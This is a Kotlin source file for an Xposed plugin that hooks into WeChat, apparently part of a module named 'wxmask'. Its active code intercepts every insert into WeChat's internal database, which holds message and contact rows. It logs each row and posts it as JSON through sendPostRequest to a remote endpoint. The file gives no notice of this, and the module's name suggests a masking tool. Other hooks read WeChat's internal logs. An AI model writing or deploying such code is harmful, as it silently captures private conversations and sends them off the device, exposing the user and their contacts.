package com.lu.wxmask.plugin.part

import android.content.ContentValues
import android.content.Context
import android.view.View
import com.lu.lposed.api2.XposedHelpers2
import com.lu.lposed.plugin.IPlugin
import com.lu.magic.util.ReflectUtil
import com.lu.magic.util.log.LogUtil
import com.lu.wxmask.ClazzN
import com.lu.wxmask.sendPostRequest
import com.lu.wxmask.util.ext.toJson
import de.robv.android.xposed.IXposedHookZygoteInit.StartupParam
import de.robv.android.xposed.XC_MethodHook
import de.robv.android.xposed.XSharedPreferences
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam


class ChatRoomPlugin : IPlugin {
    private var sharedPreferences: XSharedPreferences? = null

    override fun handleHook(context: Context, lpparam: LoadPackageParam) {
//        handleLoadPackage(lpparam)
        LogUtil.i("ChatRoomPlugin handleHook")
//        val listViewField = XposedHelpers2.findField(
//            Class.forName(
//                "com.tencent.mm.ui.chatting.view.MMChattingListView", false,
//                context.classLoader
//            ),
//            "C"
//        )
//        LogUtil.i("ChatRoomPlugin listViewField=${listViewField}")
////        LogUtil.i("ChatRoomPlugin listViewField=$context")
//        val onEnterBeginMethod = XposedHelpers2.findMethodExactIfExists(
//            "com.tencent.mm.ui.chatting.view.MMChattingListView",
//            context.classLoader,
//            "setAdapter",
//            ClazzN.from("com.tencent.mm.pluginsdk.ui.tools.s3", context.classLoader)
//        )
//        XposedHelpers2.hookMethod(onEnterBeginMethod, object : XC_MethodHook() {
//            override fun beforeHookedMethod(param: MethodHookParam?) {
//                super.beforeHookedMethod(param)
//                LogUtil.i("getBaseAdapter===> ${param}")
//            }
//        })

        XposedHelpers2.findAndHookMethod(ClazzN.from("com.tencent.wcdb.database.SQLiteDatabase"),
            "insertWithOnConflict",
            String::class.java,
            String::class.java,
            ContentValues::class.java,
            Int::class.java,
            object : XC_MethodHook() {
                override fun beforeHookedMethod(param: MethodHookParam) {
                    super.beforeHookedMethod(param)
                    val tableName = param.args[0].toString()
                    val values = param.args[2] as ContentValues
                    printInsertLog(
                        context,
                        tableName, (param.args[1] as String), values,
                        (param.args[3] as Int)
                    )
                }
            })
    }

    // 输出插入操作日志
    private fun printInsertLog(
        context: Context,
        tableName: String,
        nullColumnHack: String,
        contentValues: ContentValues,
        conflickValue: Int
    ) {
        val arrayConflictValues = arrayOf(
            "",
            " OR ROLLBACK ",
            " OR ABORT ",
            " OR FAIL ",
            " OR IGNORE ",
            " OR REPLACE "
        )
        if (conflickValue < 0 || conflickValue > 5) {
            return
        }
        LogUtil.w(
            "hook数据库insert. table: " + tableName
                    + "; nullColumnHack: " + nullColumnHack
                    + "; conflick values: " + arrayConflictValues[conflickValue]
                    + "; nullColumnHack: " + contentValues
        )
      sendPostRequest(context, contentValues.toJson())
    }

    fun handleLoadPackage(loadPackageParam: LoadPackageParam) {
        XposedHelpers2.findAndHookMethod(ClazzN.from("com.tencent.mm.sdk.platformtools.p2"),
            "a",
            Int::class.java,
            Long::class.java,
            String::class.java,
            String::class.java,
            String::class.java,
            Int::class.java,
            Int::class.java,
            Long::class.java,
            Long::class.java,
            String::class.java,
            object : XC_MethodHook() {
                override fun beforeHookedMethod(param: MethodHookParam?) {
                    super.beforeHookedMethod(param)
                    param?.args?.forEach {
                        if (it is String) {
                            LogUtil.i("MMChattingListView Log: $it")
                        }
                    }
                }
            })

        XposedHelpers2.findAndHookMethod(ClazzN.from("com.tencent.mm.sdk.platformtools.p2"),
            "getLogLevel",
            Long::class.java,
            object : XC_MethodHook() {
                override fun beforeHookedMethod(param: MethodHookParam?) {
                    super.beforeHookedMethod(param)
                    LogUtil.i("MMChattingListView Log: ${param?.result}")
                    param?.result = 1
                }
            })
    }

    fun initZygote(startupParam: StartupParam) {
        sharedPreferences = XSharedPreferences(modulePackageName, "default")
        XposedBridge.log(modulePackageName + " initZygote")
    }

    fun onEnter(chatListView: View, fragmentObj: Any) {
        val fieldName = XposedHelpers2.getObjectField<Any>(chatListView, "T")
        LogUtil.i("MMChattingListView.T value = $fieldName")
        val adapter = ReflectUtil.invokeMethod(fieldName, "getAdapter")

        LogUtil.i("MMChattingListView getAdapter: $adapter")
//        XposedHelpers2.findAndHookMethod(
//            adapter.javaClass,
//            "getItem",
//            Int::class.java,
//            object : XC_MethodHook() {
//                override fun afterHookedMethod(param: MethodHookParam?) {
//                    super.afterHookedMethod(param)
//                    LogUtil.i("MMChattingListView afterHookedMethod getItem: ${param?.extra}, ${param?.result}")
//                    param?.result?.let {
//                    val content = ReflectUtil.invokeMethod(it, "getContent")
//                    val type = ReflectUtil.invokeMethod(it, "getType")
//                    LogUtil.i("MMChattingListView covert=: $content, type=$type")
////                        LogUtil.i("MMChattingListView toJson=: ${it.toJson()}")
////JsonObjectKotlin
//                        /*
//                        1: 文本
//                        47：动画
//                        34：语音
//                        419430449：转账
//                        436207665：红包
//                         */
//
//                    }
//                }
//            })

//        XposedHelpers2.findAndHookMethod(
//            ClazzN.from("com.tencent.mm.storage.k9"),
//            "convertTo",
//            object :
//                XC_MethodHook() {
//                override fun afterHookedMethod(param: MethodHookParam?) {
//                    super.afterHookedMethod(param)
//
//                    LogUtil.i("MMChattingListView convertTo: ${param?.extra}, ${param?.result}")
//                }
//            })
//        ReflectUtil.invokeMethod(adapter, "registerAdapterDataObserver", object : RecyclerView.AdapterDataObserver() {
//            override fun onChanged() {
//                super.onChanged()
//                LogUtil.i("MMChattingListView.Adapter onChanged")
//            }
//
//            override fun onItemRangeChanged(positionStart: Int, itemCount: Int) {
//                super.onItemRangeChanged(positionStart, itemCount)
//                LogUtil.i("MMChattingListView.Adapter onItemRangeChanged")
//            }
//
//            override fun onItemRangeChanged(positionStart: Int, itemCount: Int, payload: Any?) {
//                super.onItemRangeChanged(positionStart, itemCount, payload)
//                LogUtil.i("MMChattingListView.Adapter onItemRangeChanged:$payload")
//            }
//
//            override fun onItemRangeInserted(positionStart: Int, itemCount: Int) {
//                super.onItemRangeInserted(positionStart, itemCount)
//                LogUtil.i("MMChattingListView.Adapter onItemRangeInserted")
//            }
//
//            override fun onItemRangeRemoved(positionStart: Int, itemCount: Int) {
//                super.onItemRangeRemoved(positionStart, itemCount)
//                LogUtil.i("MMChattingListView.Adapter onItemRangeRemoved")
//            }
//
//            override fun onItemRangeMoved(fromPosition: Int, toPosition: Int, itemCount: Int) {
//                super.onItemRangeMoved(fromPosition, toPosition, itemCount)
//                LogUtil.i("MMChattingListView.Adapter onItemRangeMoved")
//            }
//
//            override fun onStateRestorationPolicyChanged() {
//                super.onStateRestorationPolicyChanged()
//                LogUtil.i("MMChattingListView.Adapter onStateRestorationPolicyChanged")
//            }
//        })
    }

    companion object {
        private val modulePackageName = ChatRoomPlugin::class.java.getPackage().name
    }
}